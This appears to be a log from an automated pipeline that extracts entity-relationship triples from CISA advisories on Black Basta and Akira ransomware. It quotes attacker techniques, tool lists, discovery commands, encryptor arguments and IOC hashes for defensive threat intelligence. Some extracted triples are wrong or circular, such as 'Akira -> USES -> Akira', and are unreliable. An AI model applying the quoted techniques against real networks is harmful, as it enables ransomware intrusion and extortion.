- Black Basta affiliates -> USES -> NoPac
  Literal support: Black Basta affiliates have used credential scraping tools like Mimikatz, Zerologon, NoPac and PrintNightmare for privilege escalation.

## AA24-131A:evaluation:llama500:15803:17845

Status: candidates_ready_for_review
Case time: 2.96 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a

Exact source window:

 Dell, to evade detection.
Impair Defenses: Disable or Modify Tools
T1562.001
Black Basta affiliates have deployed a tool called Backstab to disable endpoint detection and response (EDR) tooling.
Black Basta affiliates have used PowerShell to disable antivirus products.
Table 5: Black Basta ATT&CK Techniques for Execution
Technique Title
ID
Use
User Execution
T1204
Black Basta affiliates have used social engineering techniques to convince users to execute legitimate remote access tools such as AnyDesk and Microsoft’s Quick Assist.
Command and Scripting Interpreter: PowerShell
T1059.001
Black Basta affiliates have used PowerShell to disable antivirus products.
Table 6: Black Basta ATT&CK Techniques for Impact
Technique Title
ID
Use
Inhibit System Recovery
T1490
Black Basta affiliates have used the vssadmin.exe program to delete shadow copies.
Data Encrypted for Impact
T1486
Black Basta affiliates have used a public key to fully encrypt files.
Indicators of Compromise
Update November 8, 2024:
Many indicators provided in this advisory’s initial publication have been removed considering they are outdated. For historic reference, see AA24-131A #StopRansomware: Black Basta (Initial Version).
The IOCs listed in Tables 7–8 were obtained from trusted third-party reporting and are considered most current.
Disclaimer: The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking, as many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.
Table 7: Network Indicators
IP Address
First Seen
Description
170.130.165[.]73
October 14, 2024
Likely Cobalt Strike infrastructure
45.11.181[.]44
October 24, 2024
Likely Cobalt Strike infrastructure
66.42.118[.]54
October 15, 2024
Exfiltration server
79.132.130[.]211
October 24, 2024
Likely Cobalt Strike infrastructure
Table 8: Suspected Black Basta Cobalt Strike Domains
Domain
First Seen
Moereng[.]com
October 9, 2024
Exckicks[.]com
October 2, 2024
Update End


- Black Basta affiliates -> USES -> Backstab
  Literal support: Black Basta affiliates have deployed a tool called Backstab to disable endpoint detection and response (EDR) tooling.
- Black Basta affiliates -> USES -> AnyDesk
  Literal support: Black Basta affiliates have used social engineering techniques to convince users to execute legitimate remote access tools such as AnyDesk and Microsoft’s Quick Assist.
- Black Basta affiliates -> USES -> Microsoft’s Quick Assist
  Literal support: Black Basta affiliates have used social engineering techniques to convince users to execute legitimate remote access tools such as AnyDesk and Microsoft’s Quick Assist.
- Black Basta affiliates -> USES -> Quick Assist
  Literal support: Black Basta affiliates have used social engineering techniques to convince users to execute legitimate remote access tools such as AnyDesk and Microsoft’s Quick Assist.

## AA24-109A:evaluation:llama500:4787:6854

Status: candidates_ready_for_review
Case time: 3.07 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:


Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 18. See the MITRE ATT&CK Tactics and Techniques section of this advisory for tables with the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Initial Access
FBI and cybersecurity researchers1 observed Akira threat actors obtaining initial access to organizations through a virtual private network (VPN) service without multifactor authentication (MFA) configured,2 mostly using known Common Vulnerabilities and Exposures (CVEs) [T1190], including:
CVE-2020-3259 [Common Weakness Enumeration (CWE)-200: Exposure of Sensitive Information to an Unauthorized Actor];
CVE-2023-20269 [CWE-288: Authentication Bypass Using an Alternate Path or Channel];
Update Nov. 13, 2025:
CVE-2020-3580 [CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)]3
CVE-2023-28252 [CWE-122: Heap-based Buffer Overflow];4 and
CVE-2024-37085 [CWE-305: Authentication Bypass by Primary Weakness].5
Additionally, the authoring organizations observed Akira threat actors using these CVE exploits for initial access:
CVE-2023-27532 [CWE-306: Missing Authentication for Critical Function];
CVE-2024-40711 [CWE-502: Deserialization of Untrusted Data]; and
CVE-2024-40766 [CWE-284: Improper Access Control].
End Update
For initial access, Akira threat actors also use techniques including spearphishing [T1566.001][T1566.002], abusing valid credentials [T1078], and techniques that leverage external-facing services, like Remote Desktop Protocol (RDP) [T1133].6
Update Nov. 13, 2025:
Akira threat actors gain access to VPN products such as SonicWall, by stealing login credentials or exploiting vulnerabilities like CVE-2024-40766. In some instances, they gain initial access through compromised VPN credentials, potentially by using initial access brokers or brute-forcing VPN endpoints [T1110]. Additionally, Akira threat actors deploy password spraying techniques, using tools such as SharpDomainSpray to gain access to account credentials [T1110.003].


- Akira threat actors -> USES_TECHNIQUE -> T1190
  Literal support: FBI and cybersecurity researchers1 observed Akira threat actors obtaining initial access to organizations through a virtual private network (VPN) service without multifactor authentication (MFA) configured,2 mostly using known Common Vulnerabilities and Exposures (CVEs) [T1190]
- Akira threat actors -> USES_TECHNIQUE -> T1566.001
  Literal support: For initial access, Akira threat actors also use techniques including spearphishing [T1566.001][T1566.002]
- Akira threat actors -> USES_TECHNIQUE -> T1566.002
  Literal support: For initial access, Akira threat actors also use techniques including spearphishing [T1566.001][T1566.002]
- Akira threat actors -> USES -> SharpDomainSpray
  Literal support: Additionally, Akira threat actors deploy password spraying techniques, using tools such as SharpDomainSpray to gain access to account credentials [T1110.003].

## AA24-109A:evaluation:llama500:6537:8882

Status: candidates_ready_for_review
Case time: 3.27 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

 instances, they gain initial access through compromised VPN credentials, potentially by using initial access brokers or brute-forcing VPN endpoints [T1110]. Additionally, Akira threat actors deploy password spraying techniques, using tools such as SharpDomainSpray to gain access to account credentials [T1110.003].
Akira threat actors also deploy payloads to target Nutanix Acropolis Hypervisor (AHV) systems; this is the first observed instance in which Akira threat actors encrypted Nutanix AHV virtual machine (VM) disk files, indicating that they targeted hypervisors beyond the historical targeting of VMware ESXi and Hyper-V.
In other incidents, indicators suggest that Akira threat actors gained initial access through the Secure Shell (SSH) protocol by exploiting a router’s IP address [T1021.004]. After tunneling through a targeted router, Akira threat actors exploit publicly available vulnerabilities, such as those found in the Veeam Backup and Replication component of unpatched Veeam backup servers [T1068] (CVE-2023-27532 and CVE-2024-40711).7
End Update
Execution
Update Nov. 13, 2025:
Akira threat actors frequently execute malicious commands by using Visual Basic (VB) scripts (event-driven programming languages that allow documents to contain macros to improve functionality through autonomous task execution) [T1059.005].
End Update
Persistence and Discovery
Once initial access is achieved, Akira threat actors attempt to establish persistence by creating new domain accounts [T1136.002] to abuse the functions of domain controllers. In some instances, the authoring organizations identified Akira threat actors creating an administrative account named itadm.
According to the authoring organizations and open source reporting, Akira threat actors leverage post-exploitation techniques, such as Kerberoasting,8 to extract credentials stored in the process memory of the Local Security Authority Subsystem Service (LSASS)9 [T1003.001]. Akira threat actors also use credential scraping tools [T1003], like Mimikatz and LaZagne, to aid in privilege escalation. For network discovery and reconnaissance, actors use tools like SoftPerfect, Advanced IP Scanner, and NetScan [T1016]. net Windows commands [T1059.003] are used to identify domain controllers [T1018] and gather information on domain trust relationships [T1482].


- Akira threat actors -> USES_TECHNIQUE -> T1110.003
  Literal support: Additionally, Akira threat actors deploy password spraying techniques, using tools such as SharpDomainSpray to gain access to account credentials [T1110.003].
- Akira threat actors -> USES_TECHNIQUE -> T1021.004
  Literal support: In other incidents, indicators suggest that Akira threat actors gained initial access through the Secure Shell (SSH) protocol by exploiting a router’s IP address [T1021.004].
- Akira threat actors -> USES_TECHNIQUE -> T1059.005
  Literal support: Akira threat actors frequently execute malicious commands by using Visual Basic (VB) scripts (event-driven programming languages that allow documents to contain macros to improve functionality through autonomous task execution) [T1059.005].
- net -> USES_TECHNIQUE -> T1016
  Literal support: For network discovery and reconnaissance, actors use tools like SoftPerfect, Advanced IP Scanner, and NetScan [T1016]. net Windows commands [T1059.003] are used to identify domain controllers [T1018] and gather information on domain trust relationships [T1482].

## AA24-109A:evaluation:llama500:8607:10825

Status: candidates_ready_for_review
Case time: 3.39 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

 escalation. For network discovery and reconnaissance, actors use tools like SoftPerfect, Advanced IP Scanner, and NetScan [T1016]. net Windows commands [T1059.003] are used to identify domain controllers [T1018] and gather information on domain trust relationships [T1482].
See Table 1 for a descriptive listing of tools leveraged for malicious purposes by Akira threat actors.
Update Nov. 13, 2025:
The authoring organizations observed Akira threat actors using nltest /dclist: and nltest /DOMAIN_TRUSTS [T1018][T1482] for network and domain discovery.
End Update
Defense Evasion
As Akira threat actors prepare for lateral movement, they commonly disable security software to avoid detection. Cybersecurity researchers observed Akira threat actors using PowerTool to exploit the Zemana AntiMalware driver10 and terminate antivirus-related processes [T1562.001].
Update Nov. 13, 2025:
In addition, the authoring organizations observed Akira threat actors abusing remote access tools such as AnyDesk and LogMeIn [T1219] to maintain persistence and blend in with administrator activity. Akira threat actors leverage Impacket (an open source tool designed for network protocol manipulation) to execute the remote command wmiexec.py. To evade detection, Akira threat actors implement techniques such as uninstalling endpoint detection and response (EDR) systems [T1562.001].
End Update
Privilege Escalation
Update Nov. 13, 2025:
The authoring organizations observed Akira threat actors creating new user accounts and adding them to the administrator group to establish a foothold in the environment [T1136.001]. In a reported incident, Akira threat actors bypassed Virtual Machine Disk (VMDK) file protection by temporarily powering down the domain controller’s VM, copying the VMDK files, and attaching them to a newly created VM. This sequence of actions enabled them to extract the NTDS.dit file and the SYSTEM hive, ultimately compromising a highly privileged domain administrator’s account [T1003.002][T1003.003].11 Akira threat actors have also been observed leveraging services like Veeam.Backup.MountService.exe for privilege escalation (CVE-2024-40711) [T1068].
End Update
Lateral Movement
Update Nov. 13, 2025:


- net -> USES_TECHNIQUE -> T1016
  Literal support: For network discovery and reconnaissance, actors use tools like SoftPerfect, Advanced IP Scanner, and NetScan [T1016]. net Windows commands [T1059.003] are used to identify domain controllers [T1018] and gather information on domain trust relationships [T1482].
- SoftPerfect -> USES_TECHNIQUE -> T1016
  Literal support: For network discovery and reconnaissance, actors use tools like SoftPerfect, Advanced IP Scanner, and NetScan [T1016]. net Windows commands [T1059.003] are used to identify domain controllers [T1018] and gather information on domain trust relationships [T1482].
- Advanced IP Scanner -> USES_TECHNIQUE -> T1016
  Literal support: For network discovery and reconnaissance, actors use tools like SoftPerfect, Advanced IP Scanner, and NetScan [T1016]. net Windows commands [T1059.003] are used to identify domain controllers [T1018] and gather information on domain trust relationships [T1482].
- NetScan -> USES_TECHNIQUE -> T1016
  Literal support: For network discovery and reconnaissance, actors use tools like SoftPerfect, Advanced IP Scanner, and NetScan [T1016]. net Windows commands [T1059.003] are used to identify domain controllers [T1018] and gather information on domain trust relationships [T1482].

## AA24-109A:evaluation:llama500:10612:12792

Status: candidates_ready_for_review
Case time: 3.55 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

1003.003].11 Akira threat actors have also been observed leveraging services like Veeam.Backup.MountService.exe for privilege escalation (CVE-2024-40711) [T1068].
End Update
Lateral Movement
Update Nov. 13, 2025:
To pivot laterally, Akira threat actors use legitimate remote access tools like AnyDesk or LogMeIn [T1219]. They also employ RDP [T1021.001], SSH [T1021.004], and MobaXterm to expand their presence within the compromised network [T1021].
End Update
Command and Control
Update Nov. 13, 2025:
Based on observations from the authoring organizations and trusted third-party reporting, it has been determined that Megazord has likely fallen out of use since 2024.12
End Update
Trusted third-party investigations revealed that Akira threat actors deployed two distinct ransomware variants against different system architectures during one attempted compromise. Analysts first identified Akira threat actors deploying the Windows-specific “Megazord” ransomware, and further investigation revealed the threat actors concurrently deployed a second payload during the attack, later identified as a novel variant of the Akira ESXi encryptor, Akira_v2.
Update Nov. 13, 2025:
The authoring organizations observed Akira threat actors establishing command and control (C2) communications by using tunneling utilities, such as Ngrok [T1572], to initiate encrypted sessions that bypass perimeter monitoring. They also use PowerShell and Windows Management Instrumentation Command-line (WMIC) [T1059.001] to disable services and execute malicious scripts.
End Update
Exfiltration and Impact
Akira threat actors leverage tools such as FileZilla and WinRAR to collect data [T1560.001] and WinSCP and RClone to exfiltrate data [T1048]. To establish C2 channels, threat actors leverage readily available tools like AnyDesk, MobaXterm, RustDesk, and Cloudflare Tunnel. These tools enable exfiltration through various protocols such as File Transfer Protocol (FTP), Secure File Transfer Protocol (SFTP), and cloud storage services like Mega [T1537], to connect to exfiltration servers. In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].


- Akira threat actors -> USES_TECHNIQUE -> T1068
  Literal support: 1003.003].11 Akira threat actors have also been observed leveraging services like Veeam.Backup.MountService.exe for privilege escalation (CVE-2024-40711) [T1068].
- AnyDesk -> USES_TECHNIQUE -> T1219
  Literal support: To pivot laterally, Akira threat actors use legitimate remote access tools like AnyDesk or LogMeIn [T1219].
- Ngrok -> USES_TECHNIQUE -> T1572
  Literal support: The authoring organizations observed Akira threat actors establishing command and control (C2) communications by using tunneling utilities, such as Ngrok [T1572]
- FileZilla -> USES_TECHNIQUE -> T1560.001
  Literal support: Akira threat actors leverage tools such as FileZilla and WinRAR to collect data [T1560.001] and WinSCP and RClone to exfiltrate data [T1048].

## AA24-109A:evaluation:llama500:12528:14948

Status: candidates_ready_for_review
Case time: 3.19 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

 such as File Transfer Protocol (FTP), Secure File Transfer Protocol (SFTP), and cloud storage services like Mega [T1537], to connect to exfiltration servers. In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].
After exfiltrating data, Akira threat actors use a double-extortion model [T1657], which involves threat actors both encrypting systems [T1486] and threatening to leak sensitive information. The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via a .onion URL, which is accessible through the Tor network [T1090.003][T1573.002].
(Note: Tor, short for The Onion Router, is a decentralized network designed to anonymize internet traffic by routing it through multiple servers, encrypting data at each step. This network is often leveraged by threat actors to conceal their identities and activities, enabling secure and anonymous communication channels for malicious purposes, such as ransomware negotiations.)
Akira threat actors do not leave an initial ransom demand or payment instructions on compromised networks and do not relay this information until contacted by the victim. Victims make ransom payments by using Bitcoin to cryptocurrency-wallet addresses provided by the Akira threat actors. To further apply pressure, Akira threat actors threaten to publish exfiltrated data on the Tor network, and in some instances have called victimized companies, according to FBI reporting.
Update Nov. 13, 2025:
In some incidents, Akira threat actors exfiltrated data in just over two hours from initial access.13
End Update
Encryption
Akira threat actors use a sophisticated hybrid encryption scheme to lock data. This involves combining a ChaCha20 stream cipher with an RSA public-key cryptosystem for a fast and secure key exchange [T1486]. This multilayered approach customizes encryption methods based on file type and size, and enables full or partial encryption. Encrypted files are appended with a .akira or .powerranges extension.
Update Nov. 13, 2025:
With the new Akira_v2 variant, encrypted files are appended either with an .akira or .powerranges extension, or with .akiranew or .aki.
End Update
To further inhibit system recovery and impede forensic analysis, Akira’s encryptor (w.exe) uses PowerShell commands to delete Volume Shadow Copy Service (VSS) copies on Windows systems [T1490].


- Akira threat actors -> USES -> Ngrok
  Literal support: In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].
- Akira threat actors -> USES_TECHNIQUE -> T1090
  Literal support: In some instances, Akira threat actors use Ngrok to create secure tunnels for data exfiltration [T1090].
- Akira -> USES_TECHNIQUE -> T1090.003
  Literal support: The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via a .onion URL, which is accessible through the Tor network [T1090.003][T1573.002].
- Akira -> USES_TECHNIQUE -> T1573.002
  Literal support: The Akira ransom note provides each company with a unique code and instructions to contact the threat actors via a .onion URL, which is accessible through the Tor network [T1090.003][T1573.002].

## AA24-109A:evaluation:llama500:14693:17032

Status: candidates_ready_for_review
Case time: 1.16 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

powerranges extension, or with .akiranew or .aki.
End Update
To further inhibit system recovery and impede forensic analysis, Akira’s encryptor (w.exe) uses PowerShell commands to delete Volume Shadow Copy Service (VSS) copies on Windows systems [T1490].
Update Nov. 13, 2025:
Additionally, a ransom note named fn.txt or akira_readme.txt appears in both the root directory (C:) and each user’s home directory (C:\Users).
End Update
Trusted third-party analysis determined the Akira_v2 encryptor is an upgrade from its previous version and includes additional functionalities because it is written in Rust. Previous versions of the encryptor provided options to insert arguments at runtime, including:
- p –encryption_path (targeted file/folder paths);
-s –share_file (targeted network drive path);
-n –encryption_percent (percentage of encryption); and
--fork (create a child process for encryption).
Including threads allows the threat actors more granular control over the number of CPU cores in use, increasing the speed and efficiency of the encryption process. The Akira_v2 encryptor also adds a layer of protection, using the Build ID as a run condition to hinder dynamic analysis. The encryptor is unable to successfully execute without the specific Build ID. Akira_v2 also can deploy against only VMs using vmonly and stop running VMs with stopvm functionalities. After encryption, the Linux ESXi variant may include the file extension akiranew or an added file named akiranew.txt as a ransom note in directories where files were encrypted with the new nomenclature.
Leveraged Tools
Table 1 lists publicly available tools and applications used by Akira threat actors, including legitimate tools repurposed for their operations. These tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.
Table 1. Tools Leveraged by Akira Ransomware Actors
Name
Description
AdFind
A command-line tool used to query and retrieve information from Active Directory [T1087.002].
Advanced IP Scanner
A network scanning tool used for reconnaissance that locates all computers on a network and conducts a scan of their ports. The program shows all network devices, gives access to shared folders, and provides remote control of computers (via RDP and Radmin) [T1046].
AnyDesk


- Akira -> USES_TECHNIQUE -> T1490
  Literal support: To further inhibit system recovery and impede forensic analysis, Akira’s encryptor (w.exe) uses PowerShell commands to delete Volume Shadow Copy Service (VSS) copies on Windows systems [T1490].

## AA24-109A:evaluation:llama500:16749:19037

Status: candidates_ready_for_review
Case time: 2.53 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

 Scanner
A network scanning tool used for reconnaissance that locates all computers on a network and conducts a scan of their ports. The program shows all network devices, gives access to shared folders, and provides remote control of computers (via RDP and Radmin) [T1046].
AnyDesk
Legitimate desktop support software used to obtain remote access to victim systems and for lateral movement, and support remote file transfer. The software can be maliciously used by threat actors to obtain remote access and maintain persistence [T1219].
LaZagne
An open source tool that enables users to recover stored passwords on Windows, Linux, and Mac OS X systems [T1555].
Mimikatz
A credential dumper that enables users to view and save authentication credentials, such as Kerberos tickets [T1550.002].
Ngrok
A reverse proxy tool [T1090] used to create a secure tunnel to servers behind firewalls or local machines without a public IP address.
PCHunter64
A tool used to acquire detailed process and system information [T1082].14
PowerShell
A cross-platform task automation solution used for various malicious activities, including deleting shadow copies, and, potentially, for credential harvesting. It is composed of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS [T1059.001].
RClone
A legitimate command-line program used to sync files with cloud storage services, such as Mega. Akira threat actors use it maliciously to exfiltrate data to compromised cloud services [T1567.002].
SoftPerfect
A network scanner (netscan.exe) used to ping computers, scan ports, discover shared folders, and retrieve information about network devices via Windows Management Instrumentation (WMI), Simple Network Management Protocol (SNMP), HTTP, SSH, and PowerShell. It also scans for remote services, registry, files, and performance counters [T1046].
WinRAR
Archive utility used to split compromised data into segments and to compress [T1560.001] files into .RAR format prior to exfiltration.
WinSCP
A free, open source FTP (including SSH FTP), WebDAV, Amazon S3, and secure copy protocol client. Akira threat actors use it to transfer data from a compromised network to actor-controlled accounts [T1048].
Update Nov. 13, 2025:
7-zip


- Akira threat actors -> USES_TECHNIQUE -> T1567.002
  Literal support: Akira threat actors use it maliciously to exfiltrate data to compromised cloud services [T1567.002].
- Archive -> USES_TECHNIQUE -> T1560.001
  Literal support: Archive utility used to split compromised data into segments and to compress [T1560.001] files into .RAR format prior to exfiltration.
- Akira threat actors -> USES_TECHNIQUE -> T1048
  Literal support: Akira threat actors use it to transfer data from a compromised network to actor-controlled accounts [T1048].

## AA24-109A:evaluation:llama500:18804:21019

Status: validation_failed
Case time: 5.06 seconds; attempts: 2.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

 free, open source FTP (including SSH FTP), WebDAV, Amazon S3, and secure copy protocol client. Akira threat actors use it to transfer data from a compromised network to actor-controlled accounts [T1048].
Update Nov. 13, 2025:
7-zip
A free, open source software that enables users to compress various file formats. Akira threat actors use an archive feature within the 7-zip tool to compress data to evade detection [T1027.015].15
FileZilla
An open source client that enables users to transfer files between servers. Akira threat actors use it maliciously for data exfiltration [T1048].16
LogMeIn
A legitimate remote access tool that Akira threat actors maliciously use to move laterally and establish persistence.
NetScan
A software suite used for IP address querying, Domain Name System (DNS) investigation, and port scanning. Akira threat actors use the tool maliciously for reconnaissance [T1046].17
Ngrok
A legitimate reverse proxy tool. Akira threat actors maliciously use this tool to create secure tunnels to servers they use for data exfiltration [T1572].
NetExec
Linux-based network service exploitation tool that automates the assessment of large network security.
PowerTool
A tool used by Akira threat actors to exploit the Zemana AntiMalware driver and terminate antivirus processes [T1562.001].
PSEXESVC.exe
A Windows executable file potentially used by Akira threat actors for remote execution and payload deployments [T1569.002].
SystemBC
Multi-purpose malware that Akira threat actors use as both a remote access trojan (RAT) and a proxy bot [T1090][T1219].
Veeam Backup and Replication
A legitimate backup solution that Akira threat actors have exploited vulnerabilities in for initial access (and potentially for privilege escalation).
Cobalt Strike
A commercial penetration testing framework abused by Akira threat actors for lateral movement, C2, and privilege escalation [T1059.001].
PuTTY/PSCP
Variants of Secure Copy Protocol (SCP)/SFTP tools that can be used for data exfiltration or remote management [T1048].
Vssadmin.exe
A Windows executable used by Akira threat actors to delete VSS copies [T1490].
Level.io
A remote monitoring and management platform leveraged by Akira threat actors.


Error: Repeated selected relationship.

## AA24-109A:evaluation:llama500:20761:22564

Status: candidates_ready_for_review
Case time: 3.18 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

FTP tools that can be used for data exfiltration or remote management [T1048].
Vssadmin.exe
A Windows executable used by Akira threat actors to delete VSS copies [T1490].
Level.io
A remote monitoring and management platform leveraged by Akira threat actors.
HeartCrypt
A packer-as-a-service obfuscation tool used by Akira threat actors to hinder analysis [T1027].
MEGA
A cloud storage utility used by Akira threat actors as the destination for exfiltrated data.
POORTRY
Malware written as a signed vulnerable Windows deriver. Akira threat actors used the malware to implement the Bring Your Own Vulnerable Driver (BYOVD) tactic [T1068].
STONESTOP
Malware that Akira threat actors used as the loader/installer for POORTRY [T1105].
SharpDomainSpray
A password spraying tool used by Akira threat actors.
OpenSSH
An open source SSH tool used by Akira threat actors for cross-platform remote management.
CLOUDFLARED
A legitimate, publicly available command-line client for Cloudflare Tunnel, a tunneling daemon that serves as a proxy for traffic from the Cloudflare network to the endpoints.
IMPACKET
A Python library that allows users to work with various network protocols.
End Update
Indicators of Compromise
Disclaimer: These IOCs were observed between June 2023 and August 2025. The authoring organizations recommend vetting or investigating these IOCs prior to taking action, such as blocking.
See Table 2 through Table 9 for Akira ransomware IOCs.
Table 2. Malicious Files and SHA-256 Hash
File Name
Hash (SHA-256)
Description
w.exe
d2fd0654710c27dcf37b6c1437880020824e161dd0bf28e3a133ed777242a0ca
Akira ransomware encryptor.
Win.exe
dcfa2800754e5722acf94987bb03e814edcb9acebda37df6da1987bf48e5b05e
Akira ransomware encryptor.
Akira_v2
3298d203c2acb68c474e5fdad8379181890b4403d6491c523c13730129be3f75


- Akira threat actors -> USES_TECHNIQUE -> T1490
  Literal support: A Windows executable used by Akira threat actors to delete VSS copies [T1490].
- Akira threat actors -> USES_TECHNIQUE -> T1027
  Literal support: A packer-as-a-service obfuscation tool used by Akira threat actors to hinder analysis [T1027].
- Akira threat actors -> USES_TECHNIQUE -> T1068
  Literal support: Akira threat actors used the malware to implement the Bring Your Own Vulnerable Driver (BYOVD) tactic [T1068].
- Akira threat actors -> USES_TECHNIQUE -> T1105
  Literal support: Malware that Akira threat actors used as the loader/installer for POORTRY [T1105].

## AA24-109A:evaluation:llama500:22442:23336

Status: candidates_ready_for_review
Case time: 3.54 seconds; attempts: 2.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

df6da1987bf48e5b05e
Akira ransomware encryptor.
Akira_v2
3298d203c2acb68c474e5fdad8379181890b4403d6491c523c13730129be3f75
0ee1d284ed663073872012c7bde7fac5ca1121403f1a5d2d5411317df282796c
Akira_v2 ransomware.
Megazord
ffd9f58e5fe8502249c67cad0123ceeeaa6e9f69b4ec9f9e21511809849eb8fc
dfe6fddc67bdc93b9947430b966da2877fda094edf3e21e6f0ba98a84bc53198
131da83b521f610819141d5c740313ce46578374abb22ef504a7593955a65f07
9f393516edf6b8e011df6ee991758480c5b99a0efbfd68347786061f0e04426c
9585af44c3ff8fd921c713680b0c2b3bbc9d56add848ed62164f7c9b9f23d065
2f629395fdfa11e713ea8bf11d40f6f240acf2f5fcf9a2ac50b6f7fbc7521c83
7f731cc11f8e4d249142e99a44b9da7a48505ce32c4ee4881041beeddb3760be
95477703e789e6182096a09bc98853e0a70b680a4f19fa2bf86cbb9280e8ec5a
0c0e0f9b09b80d87ebc88e2870907b6cacb4cd7703584baf8f2be1fd9438696d
C9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0
Akira Megazord ransomware.


- Akira -> USES -> Akira
  Literal support: Akira ransomware encryptor.

## AA24-109A:evaluation:llama500:23225:24336

Status: candidates_ready_for_review
Case time: 3.08 seconds; attempts: 2.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

af8f2be1fd9438696d
C9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0
Akira Megazord ransomware.
VeeamHax.exe
aaa6041912a6ba3cf167ecdb90a434a62feaf08639c59705847706b9f492015d
Plaintext credential leaking tool.
Veeam-Get-Creds.ps1
18051333e658c4816ff3576a2e9d97fe2a1196ac0ea5ed9ba386c46defafdb88
PowerShell script for obtaining and decrypting accounts from Veeam servers.
PowershellKerberos TicketDumper
5e1e3bf6999126ae4aa52146280fdb913912632e8bac4f54e98c58821a307d32
Kerberos ticket dumping tool from Local Security Authority (LSA) cache.
Update Nov. 13, 2025:
Ladon.exe
58359209e215a9fc0dafd14039121398559790dba9aa2398c457348ee1cb8a4d
Akira ransomware file.
qKtul.vbs
cf3465d7e49b609defa1e2b6cfcc86ffa30c72246cb2744dbf50736c5f3d74d5
VBScript used by Akira ransomware.
s64.dll
58afef43cec0ee7a2fbfd9cdd5b71f55f971672d5e523a400b82b98c752ca5b7
Backdoor.
w.exe
bfd5fc6cd3dea74738ac7025fa14ea844f400708df2293572796568f65bd6b61
Encryptor.
1.bat
8e12c8eb39cec9a414b56a36acbcc1a5b31dc96a38bc668138a00f94f7c26ea5
Encryptor launcher.
2.exe
4DC9F9684F715F50946E85557B82AF80FCB45576EFAD47EEE1BF054C15E570F0


- Akira -> USES -> Akira
  Literal support: Akira Megazord ransomware.

## AA24-109A:evaluation:llama500:24217:25330

Status: candidates_ready_for_review
Case time: 3.12 seconds; attempts: 2.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

96a38bc668138a00f94f7c26ea5
Encryptor launcher.
2.exe
4DC9F9684F715F50946E85557B82AF80FCB45576EFAD47EEE1BF054C15E570F0
Malicious artifact.
akira.exe, win.exe
7266e2afb5c70788c018d684698b0940eded4cb863f2b33f4edd31b59d1eab1d
Ransomware.
w.exe
c0f706ff43936c1bb19db4f39b11129c3fc8ddafbd159852475ef99a246b2f79
Akira ransomware.
File.exe
3a25d3f82651567e5760e48ad06c9f6caab4f9fdc071e98919163b3a71e67168
Malicious artifact.
win_locker.exe
CFA209D56E296C40B32815270060E539963D68CDA3285C5F393C97EB3C960D37
Encryptor executable.
moe.exe
77d48e8c13ce066b197905cc8fc69969af69b74d25f5e95dcd1302ada2e7ccec
Malicious artifact.
End Update
Update Nov. 13, 2025:
Table 3. Malicious Files and MD5 Hash
File Name
Hash (MD5)
Description
123.zip
57D1AEB41D9CFEA4D6899724BC4B09A5
Archive containing encryption malware and an AnyDesk setup.
All.bat
17c624693f5dd575485ec4286b0ba786
Encryption script.
w.exe
C56B31C9080B993D57C100B91D096C33
Akira ransomware.
w.exe
2FED7579556F01161BB1FDFD1C3E9E6C
Encryption script.
s.bat
24e19d29a47b6b5e1a39bf5e4c313194
Encryption script.
Start.bat
814310fb7a59f23e3e137ee6fee04fa1
Encryption script.


- akira -> USES -> akira
  Literal support: akira.exe, win.exe

## AA24-109A:evaluation:llama500:25188:26526

Status: empty_extraction
Case time: 0.49 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a

Exact source window:

6C
Encryption script.
s.bat
24e19d29a47b6b5e1a39bf5e4c313194
Encryption script.
Start.bat
814310fb7a59f23e3e137ee6fee04fa1
Encryption script.
Table 4. Malicious Files and SHA-1 Hash
File Name
Hash (SHA 1)
Description
Vmware.exe
5961a99181df157b81d35a50eeb27f96577a2fa2
Akira encryptor.
w.exe
d5efaa22a74aab87d17f8666686b554e41fb389a
Akira ransomware.
w.exe
08CF869A19C76CA718BA80EF73636E7BC38218B8
Akira ransomware.
snaffler.exe
ef328f68c6d865ba4ef4223b5d8ee9efb5667420
Script used to enumerate sensitive data.
Table 5. Malicious File Descriptions
File Name
Description
Edge_server.exe
Akira artifact.
lck.exe
Akira ransomware file.
1.bat
Malicious batch file.
1.exe
Encryption script.
locker.exe
Encryption script.
Win_locker_0234-BMMNBW-MONC.exe
Encryption script.
level.exe
Trojanized level.io malicious payload.
level-windows-amd64.exe
Trojanized level.io malicious payload.
End Update
Note: Trusted third-party analysis confirmed the Akira threat actors’ ransomware samples in Table 6 were created on Dec. 28, 2023.
Table 6. Windows Akira Ransomware Samples
Hash (SHA-256)
